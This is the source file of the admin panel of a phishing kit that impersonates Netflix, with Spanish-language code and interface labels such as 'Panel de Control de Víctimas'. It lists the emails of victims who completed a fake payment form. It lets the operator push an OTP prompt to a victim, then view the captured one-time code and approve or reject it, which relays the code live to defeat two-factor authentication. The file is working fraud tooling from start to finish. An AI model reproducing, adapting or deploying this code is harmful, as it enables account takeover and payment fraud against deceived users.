<?php
// Contraseña simple para el panel de administración
$admin_password = "admin123";

// Verificar si se ha enviado la contraseña
$authenticated = false;
if (isset($_POST['password']) && $_POST['password'] === $admin_password) {
    $authenticated = true;
} elseif (isset($_COOKIE['admin_auth']) && $_COOKIE['admin_auth'] === md5($admin_password)) {
    $authenticated = true;
}

// Si está autenticado, establecer cookie
if ($authenticated) {
    setcookie('admin_auth', md5($admin_password), time() + 3600, '/');
}

// Procesar acciones
if ($authenticated && isset($_GET['action'])) {
    $action = $_GET['action'];
    $session_id = $_GET['session'] ?? '';
    
    if ($action === 'force_otp' && !empty($session_id)) {
        $session_file = __DIR__ . "/sessions/{$session_id}.json";
        
        if (file_exists($session_file)) {
            $session_data = json_decode(file_get_contents($session_file), true);
            $session_data['otp_requested'] = true;
            $session_data['status'] = 'requested';
            $session_data['otp_timestamp'] = time();
            $session_data['updated_at'] = date('Y-m-d H:i:s');
            
            file_put_contents($session_file, json_encode($session_data, JSON_PRETTY_PRINT));
            
            // Redirigir de vuelta al panel
            header("Location: admin.php?success=1");
            exit();
        }
    } elseif ($action === 'delete' && !empty($session_id)) {
        $session_file = __DIR__ . "/sessions/{$session_id}.json";
        
        if (file_exists($session_file)) {
            unlink($session_file);
            
            // Redirigir de vuelta al panel
            header("Location: admin.php?deleted=1");
            exit();
        }
    } elseif ($action === 'clear_all') {
        $sessions_dir = __DIR__ . '/sessions';
        $files = glob($sessions_dir . '/*.json');
        
        foreach ($files as $file) {
            unlink($file);
        }
        
        // Redirigir de vuelta al panel
        header("Location: admin.php?cleared=1");
        exit();
    }
}

// Función para obtener todas las sesiones
function getSessions() {
    $sessions = [];
    $sessions_dir = __DIR__ . '/sessions';
    
    if (!is_dir($sessions_dir)) {
        mkdir($sessions_dir, 0777, true);
        return $sessions;
    }
    
    $files = glob($sessions_dir . '/*.json');
    
    foreach ($files as $file) {
        $data = json_decode(file_get_contents($file), true);
        if ($data) {
            $sessions[] = $data;
        }
    }
    
    // Ordenar por timestamp (más reciente primero)
    usort($sessions, function($a, $b) {
        $time_a = strtotime($a['created_at'] ?? 0);
        $time_b = strtotime($b['created_at'] ?? 0);
        return $time_b - $time_a;
    });
    
    return $sessions;
}

// Obtener la URL base
$config = include 'config.php';
$base_url = $config['base_url'];
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración - Netflix Phishing</title>
    <link rel="icon" href="netflix/nficon2023.ico" type="image/x-icon">
    <style>
        @font-face {
            font-family: 'Netflix Sans';
            font-weight: 400;
            src: url('netflix/NetflixSans_W_Rg.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Netflix Sans';
            font-weight: 700;
            src: url('netflix/NetflixSans_W_Bd.woff2') format('woff2');
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Netflix Sans', Arial, sans-serif;
        }
        
        body {
            background-color: #141414;
            color: #fff;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #333;
        }
        
        .logo {
            height: 40px;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #e50914;
        }
        
        .login-form {
            max-width: 400px;
            margin: 100px auto;
            background-color: rgba(0, 0, 0, 0.75);
            padding: 30px;
            border-radius: 5px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            color: #ccc;
        }
        
        input[type="password"] {
            width: 100%;
            padding: 12px;
            background-color: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }
        
        button {
            background-color: #e50914;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            width: 100%;
        }
        
        button:hover {
            background-color: #f40612;
        }
        
        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        
        .alert-success {
            background-color: rgba(40, 167, 69, 0.2);
            border: 1px solid #28a745;
            color: #28a745;
        }
        
        .alert-danger {
            background-color: rgba(220, 53, 69, 0.2);
            border: 1px solid #dc3545;
            color: #dc3545;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 30px;
            background-color: rgba(0, 0, 0, 0.3);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        
        th {
            background-color: rgba(0, 0, 0, 0.5);
            color: #e50914;
            font-weight: bold;
        }
        
        tr:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }
        
        .status {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .status-waiting {
            background-color: #dc3545;
            color: white;
        }
        
        .status-requested {
            background-color: #ffc107;
            color: black;
        }
        
        .status-verified {
            background-color: #28a745;
            color: white;
        }
        
        .actions {
            display: flex;
            gap: 10px;
        }
        
        .btn {
            padding: 8px 12px;
            border-radius: 4px;
            text-decoration: none;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            border: none;
        }
        
        .btn-primary {
            background-color: #e50914;
            color: white;
        }
        
        .btn-secondary {
            background-color: #6c757d;
            color: white;
        }
        
        .btn-danger {
            background-color: #dc3545;
            color: white;
        }
        
        .btn-success {
            background-color: #28a745;
            color: white;
        }
        
        .btn-warning {
            background-color: #ffc107;
            color: black;
        }
        
        .btn:hover {
            opacity: 0.9;
        }
        
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            flex: 1;
            background-color: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border-radius: 5px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 36px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .stat-label {
            color: #ccc;
            font-size: 14px;
        }
        
        .refresh-btn {
            margin-left: auto;
            background-color: transparent;
            border: 1px solid #e50914;
            color: #e50914;
            width: auto;
        }
        
        .header-actions {
            display: flex;
            gap: 10px;
        }
        
        .auto-refresh {
            display: flex;
            align-items: center;
            margin-right: 20px;
            color: #ccc;
        }
        
        .auto-refresh input {
            margin-right: 5px;
        }
        
        .empty-state {
            text-align: center;
            padding: 50px 0;
            color: #ccc;
        }
        
        .empty-state p {
            margin-bottom: 20px;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if (!$authenticated): ?>
            <!-- Formulario de login -->
            <div class="login-form">
                <img src="netflix/Netflix_Logo_PMS.png" alt="Netflix" class="logo" style="margin-bottom: 30px;">
                <h1>Panel de Administración</h1>
                
                <?php if (isset($_POST['password']) && $_POST['password'] !== $admin_password): ?>
                    <div class="alert alert-danger">
                        Contraseña incorrecta. Inténtalo de nuevo.
                    </div>
                <?php endif; ?>
                
                <form method="post" action="">
                    <div class="form-group">
                        <label for="password">Contraseña</label>
                        <input type="password" id="password" name="password" required autofocus>
                    </div>
                    <button type="submit">Acceder</button>
                </form>
            </div>
        <?php else: ?>
            <!-- Panel de administración -->
            <header>
                <img src="netflix/Netflix_Logo_PMS.png" alt="Netflix" class="logo">
                <div class="header-actions">
                    <div id="notificationBell" class="position-relative me-3" style="cursor: pointer; margin-right: 20px; position: relative;">
                        <i class="fa fa-bell" style="font-size: 24px; color: #ccc;"></i>
                        <span id="notificationCount" style="position: absolute; top: -8px; right: -8px; background-color: #e50914; color: white; border-radius: 50%; width: 20px; height: 20px; display: none; text-align: center; font-size: 12px; line-height: 20px;">
                            0
                        </span>
                    </div>
                    <div class="auto-refresh">
                        <input type="checkbox" id="autoRefresh"> 
                        <label for="autoRefresh">Auto-actualizar (5s)</label>
                    </div>
                    <a href="otp_panel.php" class="btn" style="background-color: #007bff;">Panel OTP</a>
                    <a href="admin.php?action=clear_all" class="btn btn-danger" onclick="return confirm('¿Estás seguro de que quieres eliminar todas las sesiones?')">Borrar Todo</a>
                    <button class="btn refresh-btn" onclick="window.location.reload()">Actualizar</button>
                </div>
            </header>
            
            <h1>Panel de Control de Víctimas</h1>
            
            <?php if (isset($_GET['success'])): ?>
                <div class="alert alert-success">
                    La sesión ha sido actualizada correctamente. La víctima ahora puede ingresar el código OTP.
                </div>
            <?php endif; ?>
            
            <?php if (isset($_GET['deleted'])): ?>
                <div class="alert alert-success">
                    La sesión ha sido eliminada correctamente.
                </div>
            <?php endif; ?>
            
            <?php if (isset($_GET['cleared'])): ?>
                <div class="alert alert-success">
                    Todas las sesiones han sido eliminadas correctamente.
                </div>
            <?php endif; ?>
            
            <?php
            $sessions = getSessions();
            $total = count($sessions);
            $waiting = 0;
            $requested = 0;
            $verified = 0;
            
            foreach ($sessions as $session) {
                if (isset($session['otp_verified']) && $session['otp_verified']) {
                    $verified++;
                } elseif (isset($session['otp_requested']) && $session['otp_requested']) {
                    $requested++;
                } else {
                    $waiting++;
                }
            }
            ?>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-value"><?php echo $total; ?></div>
                    <div class="stat-label">Total de Víctimas</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value"><?php echo $waiting; ?></div>
                    <div class="stat-label">Esperando OTP</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value"><?php echo $requested; ?></div>
                    <div class="stat-label">OTP Solicitado</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value"><?php echo $verified; ?></div>
                    <div class="stat-label">OTP Verificado</div>
                </div>
            </div>
            
            <?php if (empty($sessions)): ?>
                <div class="empty-state">
                    <p>No hay víctimas registradas todavía.</p>
                    <p>Espera a que alguien complete el formulario de pago.</p>
                </div>
            <?php else: ?>
                <table>
                    <thead>
                        <tr>
                            <th>Email</th>
                            <th>Fecha</th>
                            <th>Estado</th>
                            <th>Acciones</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($sessions as $session): ?>
                            <?php
                            $status = 'waiting';
                            $status_text = 'Esperando';
                            
                            if (isset($session['otp_verified']) && $session['otp_verified']) {
                                $status = 'verified';
                                $status_text = 'Verificado';
                            } elseif (isset($session['otp_requested']) && $session['otp_requested']) {
                                $status = 'requested';
                                $status_text = 'Solicitado';
                            }
                            ?>
                            <tr>
                                <td><?php echo htmlspecialchars($session['email'] ?? 'Desconocido'); ?></td>
                                <td><?php echo htmlspecialchars($session['created_at'] ?? 'Desconocido'); ?></td>
                                <td>
                                    <span class="status status-<?php echo $status; ?>">
                                        <?php echo $status_text; ?>
                                    </span>
                                </td>
                                <td class="actions">
                                    <?php if ($status === 'waiting'): ?>
                                        <a href="admin.php?action=force_otp&session=<?php echo $session['session_id']; ?>" class="btn btn-primary">Solicitar OTP</a>
                                    <?php endif; ?>
                                    
                                    <?php if ($status === 'requested' || $status === 'verified'): ?>
                                        <button class="btn btn-warning" onclick="checkOTP('<?php echo $session['session_id']; ?>')">Ver OTP</button>
                                    <?php endif; ?>
                                    
                                    <a href="admin.php?action=delete&session=<?php echo $session['session_id']; ?>" class="btn btn-danger" onclick="return confirm('¿Estás seguro de que quieres eliminar esta sesión?')">Eliminar</a>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
            
            <!-- Modal para mostrar OTP -->
            <div id="otpModal" style="display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.8);">
                <div style="background-color: #141414; margin: 15% auto; padding: 20px; border: 1px solid #333; width: 50%; border-radius: 5px; position: relative;">
                    <span id="closeModal" style="color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer;">&times;</span>
                    <h2 style="color: #e50914; margin-bottom: 20px;">Información OTP</h2>
                    <div id="otpContent" style="margin-bottom: 20px;">
                        <div class="loading" style="text-align: center;">
                            <div style="display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #e50914; animation: spin 1s ease-in-out infinite;"></div>
                            <p>Cargando información...</p>
                        </div>
                    </div>
                    <div style="text-align: center;">
                        <button id="refreshOTP" class="btn btn-primary" style="margin-right: 10px;">Actualizar</button>
                        <button id="closeModalBtn" class="btn btn-secondary">Cerrar</button>
                    </div>
                </div>
            </div>
            
            <!-- Modal para mostrar notificaciones -->
            <div id="notificationsModal" style="display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.8);">
                <div style="background-color: #141414; margin: 10% auto; padding: 20px; border: 1px solid #333; width: 50%; border-radius: 5px; position: relative; max-height: 70vh; overflow-y: auto;">
                    <span id="closeNotificationsModal" style="color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer;">&times;</span>
                    <h2 style="color: #e50914; margin-bottom: 20px;">Notificaciones</h2>
                    <div id="notificationsContent" style="margin-bottom: 20px;">
                        <div class="loading" style="text-align: center;">
                            <div style="display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #e50914; animation: spin 1s ease-in-out infinite;"></div>
                            <p>Cargando notificaciones...</p>
                        </div>
                    </div>
                    <div style="text-align: center;">
                        <button id="clearNotifications" class="btn btn-danger">Limpiar todas</button>
                        <button id="closeNotificationsBtn" class="btn btn-secondary" style="margin-left: 10px;">Cerrar</button>
                    </div>
                </div>
            </div>

            <style>
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
                
                .otp-info {
                    background-color: rgba(0, 0, 0, 0.3);
                    padding: 15px;
                    border-radius: 5px;
                    margin-bottom: 15px;
                }
                
                .otp-code {
                    font-size: 32px;
                    font-weight: bold;
                    color: #e50914;
                    text-align: center;
                    margin: 20px 0;
                    letter-spacing: 5px;
                }
                
                .otp-status {
                    display: inline-block;
                    padding: 5px 10px;
                    border-radius: 20px;
                    font-size: 14px;
                    font-weight: bold;
                    margin-left: 10px;
                }
                
                .otp-status-waiting {
                    background-color: #dc3545;
                    color: white;
                }
                
                .otp-status-requested {
                    background-color: #ffc107;
                    color: black;
                }
                
                .otp-status-verified {
                    background-color: #28a745;
                    color: white;
                }
            </style>

            <script>
                // Auto-refresh
                const autoRefreshCheckbox = document.getElementById('autoRefresh');
                let refreshInterval;
                
                // Verificar si el checkbox estaba marcado anteriormente
                if (localStorage.getItem('autoRefreshEnabled') === 'true') {
                    autoRefreshCheckbox.checked = true;
                    startAutoRefresh();
                }
                
                autoRefreshCheckbox.addEventListener('change', function() {
                    if (this.checked) {
                        localStorage.setItem('autoRefreshEnabled', 'true');
                        startAutoRefresh();
                    } else {
                        localStorage.setItem('autoRefreshEnabled', 'false');
                        stopAutoRefresh();
                    }
                });
                
                function startAutoRefresh() {
                    // Limpiar cualquier intervalo existente primero
                    if (refreshInterval) {
                        clearInterval(refreshInterval);
                    }
                    
                    refreshInterval = setInterval(() => {
                        window.location.reload();
                    }, 5000);
                }
                
                function stopAutoRefresh() {
                    if (refreshInterval) {
                        clearInterval(refreshInterval);
                        refreshInterval = null;
                    }
                }
                
                // Modal OTP
                const modal = document.getElementById('otpModal');
                const closeModal = document.getElementById('closeModal');
                const closeModalBtn = document.getElementById('closeModalBtn');
                const refreshOTPBtn = document.getElementById('refreshOTP');
                const otpContent = document.getElementById('otpContent');
                
                let currentSessionId = '';
                
                function checkOTP(sessionId) {
                    currentSessionId = sessionId;
                    modal.style.display = 'block';
                    otpContent.innerHTML = `
                        <div class="loading" style="text-align: center;">
                            <div style="display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #e50914; animation: spin 1s ease-in-out infinite;"></div>
                            <p>Cargando información...</p>
                        </div>
                    `;
                    
                    fetchOTPInfo(sessionId);
                }
                
                function fetchOTPInfo(sessionId) {
                    fetch('get_otp.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ session_id: sessionId }),
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            let statusClass = 'otp-status-waiting';
                            let statusText = 'Esperando';
                            
                            if (data.otp_verified) {
                                statusClass = 'otp-status-verified';
                                statusText = 'Verificado';
                            } else if (data.otp_requested) {
                                statusClass = 'otp-status-requested';
                                statusText = 'Solicitado';
                            }
                            
                            let otpCodeDisplay = 'No ingresado aún';
                            if (data.otp_code) {
                                otpCodeDisplay = `<div class="otp-code">${data.otp_code}</div>`;
                            }
                            
                            // Mostrar el código OTP de manera prominente si existe y no ha sido verificado manualmente
                            let otpSection = '';
                            if (data.otp_code) {
                                otpSection = `
                                    <div style="background-color: #111; border: 2px solid #e50914; padding: 15px; margin: 15px 0; border-radius: 5px; text-align: center;">
                                        <h2 style="color: #e50914; margin-bottom: 10px;">Código OTP</h2>
                                        <div style="font-size: 32px; font-weight: bold; letter-spacing: 5px; margin-bottom: 15px;">${data.otp_code}</div>
                                        <div style="display: flex; justify-content: center; gap: 15px;">
                                            <button onclick="verifyOTP('${sessionId}', true)" class="btn" style="background-color: #28a745; font-size: 16px; padding: 10px 20px;">APROBAR</button>
                                            <button onclick="verifyOTP('${sessionId}', false)" class="btn" style="background-color: #dc3545; font-size: 16px; padding: 10px 20px;">RECHAZAR</button>
                                        </div>
                                    </div>
                                `;
                            } else if (data.otp_submitted && data.manually_verified) {
                                // Si el OTP ha sido verificado manualmente, mostrar un mensaje
                                const statusText = data.otp_verified ? 'APROBADO' : 'RECHAZADO';
                                const statusColor = data.otp_verified ? '#28a745' : '#dc3545';
                                otpSection = `
                                    <div style="background-color: #111; border: 2px solid ${statusColor}; padding: 15px; margin: 15px 0; border-radius: 5px; text-align: center;">
                                        <h2 style="color: ${statusColor}; margin-bottom: 10px;">OTP ${statusText}</h2>
                                        <p>Este OTP ya ha sido ${data.otp_verified ? 'aprobado' : 'rechazado'}.</p>
                                        <p>Esperando un nuevo código OTP del usuario.</p>
                                    </div>
                                `;
                            } else if (!data.otp_submitted) {
                                // Si no se ha enviado ningún OTP, mostrar un mensaje
                                otpSection = `
                                    <div style="background-color: #111; border: 2px solid #007bff; padding: 15px; margin: 15px 0; border-radius: 5px; text-align: center;">
                                        <h2 style="color: #007bff; margin-bottom: 10px;">Esperando OTP</h2>
                                        <p>El usuario aún no ha ingresado un código OTP.</p>
                                    </div>
                                `;
                            }
                            
                            otpContent.innerHTML = `
                                ${otpSection}
                                <div class="otp-info">
                                    <p><strong>Email:</strong> ${data.email}</p>
                                    <p><strong>Estado:</strong> <span class="otp-status ${statusClass}">${statusText}</span></p>
                                    <p><strong>Creado:</strong> ${data.created_at}</p>
                                    <p><strong>Actualizado:</strong> ${data.updated_at || 'No actualizado'}</p>
                                </div>
                            `;
                        } else {
                            otpContent.innerHTML = `
                                <div style="text-align: center; color: #dc3545;">
                                    <p>Error: ${data.message}</p>
                                </div>
                            `;
                        }
                    })
                    .catch(error => {
                        otpContent.innerHTML = `
                            <div style="text-align: center; color: #dc3545;">
                                <p>Error al obtener información: ${error.message}</p>
                            </div>
                        `;
                    });
                }
                
                closeModal.onclick = function() {
                    modal.style.display = 'none';
                }
                
                closeModalBtn.onclick = function() {
                    modal.style.display = 'none';
                }
                
                refreshOTPBtn.onclick = function() {
                    fetchOTPInfo(currentSessionId);
                }
                
                function verifyOTP(sessionId, isValid) {
                    // Mostrar mensaje de carga
                    otpContent.innerHTML = `
                        <div class="loading" style="text-align: center;">
                            <div style="display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #e50914; animation: spin 1s ease-in-out infinite;"></div>
                            <p>${isValid ? 'Aprobando' : 'Rechazando'} OTP...</p>
                        </div>
                    `;
                    
                    // Enviar solicitud a la API
                    fetch('api_verify_otp.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            session_id: sessionId,
                            is_valid: isValid
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            // Mostrar mensaje de éxito
                            otpContent.innerHTML = `
                                <div style="text-align: center; color: ${isValid ? '#28a745' : '#dc3545'};">
                                    <div style="font-size: 48px; margin-bottom: 10px;">
                                        ${isValid ? '✓' : '✗'}
                                    </div>
                                    <p>${isValid ? 'OTP aprobado correctamente' : 'OTP rechazado correctamente'}</p>
                                    <p style="margin-top: 20px;">
                                        <button onclick="modal.style.display = 'none';" class="btn">Cerrar</button>
                                    </p>
                                </div>
                            `;
                            
                            // Recargar la página después de 2 segundos
                            setTimeout(() => {
                                window.location.reload();
                            }, 2000);
                        } else {
                            // Mostrar mensaje de error
                            otpContent.innerHTML = `
                                <div style="text-align: center; color: #dc3545;">
                                    <p>Error: ${data.message}</p>
                                    <p style="margin-top: 20px;">
                                        <button onclick="fetchOTPInfo('${sessionId}');" class="btn">Intentar de nuevo</button>
                                    </p>
                                </div>
                            `;
                        }
                    })
                    .catch(error => {
                        // Mostrar mensaje de error
                        otpContent.innerHTML = `
                            <div style="text-align: center; color: #dc3545;">
                                <p>Error de conexión: ${error.message}</p>
                                <p style="margin-top: 20px;">
                                    <button onclick="fetchOTPInfo('${sessionId}');" class="btn">Intentar de nuevo</button>
                                </p>
                            </div>
                        `;
                    });
                }
                
                window.onclick = function(event) {
                    if (event.target == modal) {
                        modal.style.display = 'none';
                    }
                }
            </script>
        <?php endif; ?>
    </div>
</body>
</html>